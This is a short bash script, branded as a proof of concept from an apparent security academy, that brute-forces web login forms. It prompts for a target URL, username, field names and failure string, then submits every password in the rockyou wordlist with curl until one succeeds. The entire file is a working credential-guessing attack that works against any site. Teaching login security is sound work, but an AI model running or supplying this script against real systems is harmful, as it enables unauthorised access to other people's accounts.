#!/bin/bash
echo "
      ██████╗ ██████╗ ██╗     ██████╗
      ██╔══██╗██╔══██╗██║     ██╔══██╗
      ██║  ██║██║  ██║██║     ██████╔╝
      ██║  ██║██║  ██║██║     ██╔══██╗
      ██████╔╝██████╔╝███████╗██║  ██║
      ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
       ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▓  ░░ ▒▓ ░▒▓
       ░ ▒  ▒  ░ ▒  ▒ ░ ░ ▒  ░  ░▒ ░ ▒
       ░ ░  ░  ░ ░  ░   ░ ░     ░░   ░ 
         ░       ░        ░  ░   ░     
       ░       ░                       

DDLR Security Academy - Login BruteForce PoC
          https://edu.ddlr.org
"
read -p "Enter URL: " URL
read -p "Enter username: " usuario
read -p "Enter Failure String: " failure
read -p "Form is POST or GET? (POST/GET): " tipo
read -p "Username var: " uservar
read -p "Password var: " passvar
try=0

echo "
Ataque configurado por $tipo al $uservar $usuario y $passvar por diccionario  en $URL

"
sleep 1
echo "Comenzando en 3
"
sleep 1
echo "2
"
sleep 1
echo "1
"
sleep 1

while IFS= read -r password    
	do
	        response=$(curl -s -X $tipo -d "$uservar=$usuario&$passvar=$password" $URL)
	(( try++ ))

       if echo "$response" | grep -q "$failure"; then
            echo "#$try Login fallido con usuario: $usuario y contraseña: $password"
        else
            echo "!!!
	    #$try Login exitoso con usuario: $usuario y contraseña: $password
!!!"
exit
        fi 

        
done < "../dicts/wordlists/rockyou.txt"


